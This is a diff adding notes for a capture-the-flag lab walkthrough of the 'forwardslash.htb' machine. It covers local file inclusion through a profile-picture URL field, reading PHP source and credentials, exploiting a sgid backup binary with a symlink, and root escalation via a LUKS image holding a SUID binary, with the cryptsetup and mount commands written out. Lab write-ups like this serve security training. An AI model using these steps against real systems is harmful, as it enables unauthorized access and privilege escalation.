@@ -1,0 +1,57 @@
+# user:
+  - nmap directory for initial scans, only 22 and 80 open
+  - Website redirects you to 'forwardslash.htb', so add that to /etc/hosts
+  - A lot of enumeration
+    - Tried fuzzing for ".php" to no avail
+    - Nothing from dirb
+  - Found '/note.txt'
+    - References that they still have 'the backup site'
+  - Add 'backup.forwardslash.htb' to /etc/hosts and visit the site
+    - It's a login page!
+  - You can make an account and login
+  - Changing your profile picture still works (just have to remove disabled tags in HTML)
+    - Setup an HTTP server locally and see if it grabs a file from there
+    - Looks like it's catting out the file that you send it
+    - Probably uses 'file_get_contents' to get the file, but this means we can also get a local file -> LFI
+    - Found /etc/passwd
+    - Users: pain, chiv, www-data, root
+  - When you send 'url=./index.php', it says 'Permission Denied; not that way ;)'
+  - Found user 'pain' because the login message indicates it's not a valid password, and 'admin' isn't a valid user
+    - password is 'password'
+  - Found '/dev/' with gobuster for the backup subdomain -> access denied and then it prints my IP
+  - Found full directory of the backup site: '/var/www/backup.forwardslash.htb/welcome.php'
+    - Can use PHP base64 filters to read the file and save results (backup directory)
+  - Found creds in 'dev.api.php' for chiv
+  - SSH in as chiv
+  - Found a sgid binary called 'backup' that will grab a file as pain
+    - We want to grab the '/var/backups/config.php.bak' because there's a note indicating that a password is there
+    - RE the binary to figure out how to exploit it, essentially hashing the current time and then creating a sym link to that file, so it'll print out it's contents
+    - 'sgid/exp.sh'
+  - Found the DB pw -> try cred stuffing?
+  - It's their SSH pw -> SSH in as pain
+  - user pwned
+
+# root:
+  - See you can run a bunch of 'cryptsetup' commands with 'sudo -l' -> do some reading up
+  - Create an encrypted volume with a C program that has the SUID bit set and is owned by root, this will translate over to the same permissions when you mount it on the server
+  - This gives you the ability to escalate to root and get a shell
+  - Here are the commands to reproduce: Do this LOCALLY and then SFTP it over to the box
+    - [Source](https://elephly.net/posts/2013-10-01-dm-crypt.html)
+    - ```dd if=/dev/urandom bs=1M count=100 of=~/pwn.img```
+    - ```sudo cryptsetup luksFormat ~/pwn.img```
+    - ```sudo cryptsetup luksOpen ~/pwn.img backup```
+    - ```sudo mkfs.ext4 /dev/mapper/backup```
+    - ```mkdir ~/mnt_point```
+    - ```sudo mount /dev/mapper/backup ~/mnt_point```
+    - ```cd root```
+    - ```make```
+    - ```cp exp ~/mnt_point```
+    - ```sudo umount ~/mnt_point```
+    - ```sudo cryptsetup luksClose backup```
+  - Then sftp the created image (with your malicious binary)
+  - ```sudo /sbin/cryptsetup luksOpen pwn.img backup```
+  - ```mkdir mnt```
+  - ```sudo /bin/mount /dev/mappers/backup ./mnt/```
+  - ```cd mnt && ./exp```
+  - Now you have a root shell
+  - root pwned
